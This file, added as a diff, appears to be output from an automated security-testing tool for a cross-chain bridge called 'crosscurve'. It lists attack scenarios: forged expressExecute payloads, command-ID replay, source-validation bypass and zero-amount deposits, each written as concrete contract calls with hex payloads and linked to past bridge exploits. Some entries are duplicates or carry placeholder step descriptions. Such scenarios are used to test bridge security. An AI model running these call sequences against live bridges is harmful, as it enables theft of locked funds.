@@ -1,0 +1,976 @@
+{
+  "bridge_name": "crosscurve",
+  "scenarios": [
+    {
+      "scenario_id": "axelar_bridge_exploit",
+      "target_invariant": "asset_conservation_lock_mint_parity",
+      "vulnerability_class": "fake_deposit",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "qubit_20220127",
+        "meterio_20220205"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "PortalSrc",
+            "amount": "100000000000000000000"
+          },
+          "description": "Step 1"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "PortalSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Step 2"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Step 1"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Step 2"
+        }
+      ]
+    },
+    {
+      "scenario_id": "axelar_gateway_trusted_source_bypass",
+      "target_invariant": "authorization_valid_source_for_withdraw",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "chainswap_20210711",
+        "socket_20240116"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "PortalSrc",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve PortalSrc to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "PortalSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Initiate cross-chain transfer of 100 tokens to attacker"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "ReceiverAxelar",
+          "function": "expressExecute(bytes32,address,bytes)",
+          "params": {
+            "commandId": "0x0000000000000000000000000000000000000000000000000000000000000000",
+            "sourceAddress": "PortalSrc",
+            "payload": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000056bc75e2d63100000"
+          },
+          "description": "Bypass source validation by using expressExecute directly"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve PortalSrc to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Initiate cross-chain transfer of 100 tokens to attacker"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Bypass source validation by using expressExecute directly"
+        }
+      ]
+    },
+    {
+      "scenario_id": "axelar_gateway_bypass",
+      "target_invariant": "authorization_gateway_validation",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "socket_20240116",
+        "metpassport_20220206"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "PortalSrc",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve PortalSrc to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "PortalSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Initiate cross-chain transfer to attacker"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "ReceiverAxelar",
+          "function": "expressExecute(bytes32,address,bytes)",
+          "params": {
+            "commandId": "0x0000000000000000000000000000000000000000000000000000000000000000",
+            "sourceAddress": "PortalSrc",
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000d3c21bcecceda1000000"
+          },
+          "description": "Bypass gateway validation using expressExecute to release extra tokens"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve PortalSrc to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Initiate cross-chain transfer to attacker"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Bypass gateway validation using expressExecute to release extra tokens"
+        }
+      ]
+    },
+    {
+      "scenario_id": "axelar_command_id_reuse",
+      "target_invariant": "uniqueness_command_id_single_use",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "polynetwork_20210810",
+        "socket_20240116"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "PortalSrc",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve PortalSrc to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "PortalSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Initiate cross-chain transfer to attacker"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "ReceiverAxelar",
+          "function": "expressExecute(bytes32,address,bytes)",
+          "params": {
+            "commandId": "0x0000000000000000000000000000000000000000000000000000000000000000",
+            "sourceAddress": "PortalSrc",
+            "payload": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000056bc75e2d63100000"
+          },
+          "description": "Reuse command ID to execute same transfer again"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve PortalSrc to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Initiate cross-chain transfer to attacker"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Reuse command ID to execute same transfer again"
+        }
+      ]
+    },
+    {
+      "scenario_id": "axelar_receiver_bypass",
+      "target_invariant": "authorization_receiver_only_transfer",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "socket_20240116",
+        "nomad_20220801"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "PortalSrc",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve PortalSrc to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "PortalSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Initiate cross-chain transfer to attacker"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "ReceiverAxelar",
+          "function": "expressExecute(bytes32,address,bytes)",
+          "params": {
+            "commandId": "0x0000000000000000000000000000000000000000000000000000000000000000",
+            "sourceAddress": "PortalSrc",
+            "payload": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000056bc75e2d63100000"
+          },
+          "description": "Bypass gateway validation by using expressExecute directly"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve PortalSrc to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Initiate cross-chain transfer to attacker"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Bypass gateway validation by using expressExecute directly"
+        }
+      ]
+    },
+    {
+      "scenario_id": "axelar_zero_amount_exploit",
+      "target_invariant": "asset_conservation_non_zero_lock",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "nomad_20220801"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "PortalSrc",
+            "amount": "0"
+          },
+          "description": "Approve PortalSrc to spend 0 tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "PortalSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "0"
+          },
+          "description": "Deposit 0 tokens to trigger the bridge transfer"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "ReceiverAxelar",
+          "function": "expressExecute(bytes32,address,bytes)",
+          "params": {
+            "commandId": "0x0000000000000000000000000000000000000000000000000000000000000000",
+            "sourceAddress": "PortalSrc",
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000001b1ae4d6e2ef500000"
+          },
+          "description": "Execute the bridge transfer with a forged payload to get tokens"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve PortalSrc to spend 0 tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Deposit 0 tokens to trigger the bridge transfer"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Execute the bridge transfer with a forged payload to get tokens"
+        }
+      ]
+    },
+    {
+      "scenario_id": "axelar_express_execute_bypass",
+      "target_invariant": "authorization_express_execute_source",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "socket_20240116",
+        "metpassport_20220206"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "PortalSrc",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve PortalSrc to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "PortalSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Deposit tokens to trigger cross-chain transfer"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "ReceiverAxelar",
+          "function": "expressExecute(bytes32,address,bytes)",
+          "params": {
+            "commandId": "0x0000000000000000000000000000000000000000000000000000000000000000",
+            "sourceAddress": "PortalSrc",
+            "payload": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000056bc75e2d63100000"
+          },
+          "description": "Directly call expressExecute with spoofed source address to bypass gateway validation"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve PortalSrc to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Deposit tokens to trigger cross-chain transfer"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Directly call expressExecute with spoofed source address to bypass gateway validation"
+        }
+      ]
+    },
+    {
+      "scenario_id": "axelar_gateway_source_mismatch",
+      "target_invariant": "uniqueness_approved_source_match",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.5,
+      "retrieved_exploits": [
+        "feg_bridge_20241229"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "GatewayDst",
+          "function": "approveContractCall(bytes32,address)",
+          "params": {
+            "commandId": "0x0000000000000000000000000000000000000000000000000000000000000001",
+            "source": "attacker"
+          },
+          "description": "Approve the forged contract call with the attacker as the source"
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "ReceiverAxelar",
+          "function": "execute(bytes32,address,bytes)",
+          "params": {
+            "commandId": "0x0000000000000000000000000000000000000000000000000000000000000001",
+            "sourceAddress": "attacker",
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000003635c9adc5dea00000"
+          },
+          "description": "Execute the forged contract call to release tokens to the attacker"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve the forged contract call with the attacker as the source"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Execute the forged contract call to release tokens to the attacker"
+        }
+      ]
+    },
+    {
+      "scenario_id": "axelar_fake_deposit",
+      "target_invariant": "asset_conservation_no_negative_balances",
+      "vulnerability_class": "fake_deposit",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "nomad_20220801",
+        "meterio_20220205"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "PortalSrc",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve PortalSrc to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "PortalSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Initiate deposit to destination chain"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "ReceiverAxelar",
+          "function": "expressExecute(bytes32,address,bytes)",
+          "params": {
+            "commandId": "0x0000000000000000000000000000000000000000000000000000000000000000",
+            "sourceAddress": "PortalSrc",
+            "payload": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000056bc75e2d63100000"
+          },
+          "description": "Bypass validation and execute fake deposit"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve PortalSrc to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Initiate deposit to destination chain"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Bypass validation and execute fake deposit"
+        }
+      ]
+    },
+    {
+      "scenario_id": "axelar_fake_deposit",
+      "target_invariant": "authorization_deposit_caller_restriction",
+      "vulnerability_class": "fake_deposit",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "nomad_20220801"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "PortalSrc",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve PortalSrc to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "PortalSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Initiate a legitimate deposit to attacker's address"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "ReceiverAxelar",
+          "function": "expressExecute(bytes32,address,bytes)",
+          "params": {
+            "commandId": "0x0000000000000000000000000000000000000000000000000000000000000000",
+            "sourceAddress": "PortalSrc",
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000001b1ae4d6e2ef500000"
+          },
+          "description": "Directly call expressExecute with fake payload to mint extra tokens"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve PortalSrc to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Initiate a legitimate deposit to attacker's address"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Directly call expressExecute with fake payload to mint extra tokens"
+        }
+      ]
+    },
+    {
+      "scenario_id": "axelar_gateway_command_id_reuse",
+      "target_invariant": "uniqueness_command_id_approval",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "ronin_20240806"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "PortalSrc",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve PortalSrc to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "PortalSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Initiate cross-chain transfer to attacker's address"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "GatewayDst",
+          "function": "approveContractCall(bytes32,address)",
+          "params": {
+            "commandId": "0x0000000000000000000000000000000000000000000000000000000000000001",
+            "source": "PortalSrc"
+          },
+          "description": "Manually approve the command ID before relayer does"
+        },
+        {
+          "step": 4,
+          "chain": "destination",
+          "contract": "ReceiverAxelar",
+          "function": "expressExecute(bytes32,address,bytes)",
+          "params": {
+            "commandId": "0x0000000000000000000000000000000000000000000000000000000000000001",
+            "sourceAddress": "PortalSrc",
+            "payload": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000056bc75e2d63100000"
+          },
+          "description": "Execute the transfer without waiting for relayer approval"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve PortalSrc to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Initiate cross-chain transfer to attacker's address"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Manually approve the command ID before relayer does"
+        },
+        {
+          "waypoint_id": "w4",
+          "after_step": 4,
+          "predicate": "step_4_executed",
+          "description": "Execute the transfer without waiting for relayer approval"
+        }
+      ]
+    },
+    {
+      "scenario_id": "axelar_bridge_exploit_20231001",
+      "target_invariant": "asset_conservation_transfer_amount_match",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "thorchain_20210629",
+        "meterio_20220205"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "PortalSrc",
+            "amount": "100000000000000000000"
+          },
+          "description": "Step 1"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "PortalSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Step 2"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "ReceiverAxelar",
+          "function": "expressExecute(bytes32,address,bytes)",
+          "params": {
+            "commandId": "0x0000000000000000000000000000000000000000000000000000000000000000",
+            "sourceAddress": "PortalSrc",
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000ad78ebc5ac6200000"
+          },
+          "description": "Step 3"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Step 1"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Step 2"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Step 3"
+        }
+      ]
+    },
+    {
+      "scenario_id": "axelar_gateway_exploit_20231001",
+      "target_invariant": "authorization_gateway_only_execute",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.5,
+      "retrieved_exploits": [
+        "socket_20240116",
+        "thorchain_20210716"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcToken",
+          "function": "transferFrom(address,address,uint256)",
+          "params": {
+            "from": "0x000000000000000000000000000000000000Ab01",
+            "to": "attacker",
+            "amount": "500000000000000000000"
+          },
+          "description": "Transfer tokens from 0x000000000000000000000000000000000000Ab01 to attacker using the allowance set by 0x000000000000000000000000000000000000Ab01."
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "PortalSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "500000000000000000000"
+          },
+          "description": "Deposit tokens into PortalSrc to trigger a cross-chain transfer."
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "ReceiverAxelar",
+          "function": "expressExecute(bytes32,address,bytes)",
+          "params": {
+            "commandId": "0x0000000000000000000000000000000000000000000000000000000000000001",
+            "sourceAddress": "PortalSrc",
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000001b1ae4d6e2ef500000"
+          },
+          "description": "Directly execute the release of tokens on the destination chain without gateway validation."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Transfer tokens from 0x000000000000000000000000000000000000Ab01 to attacker using the allowance set by 0x000000000000000000000000000000000000Ab01."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Deposit tokens into PortalSrc to trigger a cross-chain transfer."
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Directly execute the release of tokens on the destination chain without gateway validation."
+        }
+      ]
+    },
+    {
+      "scenario_id": "axelar_replay_attack",
+      "target_invariant": "uniqueness_single_execution_per_command",
+      "vulnerability_class": "signature_forgery",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "polynetwork_20210810",
+        "multichain_xscope",
+        "wormhole_20220202"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "PortalSrc",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve PortalSrc to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "PortalSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Initiate cross-chain transfer to attacker on destination chain"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "ReceiverAxelar",
+          "function": "execute(bytes32,address,bytes)",
+          "params": {
+            "commandId": "0x0000000000000000000000000000000000000000000000000000000000000001",
+            "sourceAddress": "PortalSrc",
+            "payload": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000056bc75e2d63100000"
+          },
+          "description": "Replay the same commandId to execute the transfer multiple times"
+        },
+        {
+          "step": 4,
+          "chain": "destination",
+          "contract": "ReceiverAxelar",
+          "function": "execute(bytes32,address,bytes)",
+          "params": {
+            "commandId": "0x0000000000000000000000000000000000000000000000000000000000000001",
+            "sourceAddress": "PortalSrc",
+            "payload": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000056bc75e2d63100000"
+          },
+          "description": "Second replay of the same commandId to execute the transfer again"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve PortalSrc to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Initiate cross-chain transfer to attacker on destination chain"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Replay the same commandId to execute the transfer multiple times"
+        },
+        {
+          "waypoint_id": "w4",
+          "after_step": 4,
+          "predicate": "step_4_executed",
+          "description": "Second replay of the same commandId to execute the transfer again"
+        }
+      ]
+    },
+    {
+      "scenario_id": "axelar_bridge_exploit",
+      "target_invariant": "asset_conservation_total_supply_consistency",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.5,
+      "retrieved_exploits": [
+        "metpassport_20220206",
+        "synapse_20211109"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcToken",
+          "function": "transferFrom(address,address,uint256)",
+          "params": {
+            "from": "0x000000000000000000000000000000000000Ab01",
+            "to": "attacker",
+            "amount": "500000000000000000000"
+          },
+          "description": "Attacker transfers tokens from 0x000000000000000000000000000000000000Ab01 to themselves without approval"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "PortalSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "500000000000000000000"
+          },
+          "description": "Attacker deposits tokens to PortalSrc, triggering a cross-chain transfer"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Attacker transfers tokens from 0x000000000000000000000000000000000000Ab01 to themselves without approval"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Attacker deposits tokens to PortalSrc, triggering a cross-chain transfer"
+        }
+      ]
+    }
+  ]
+}
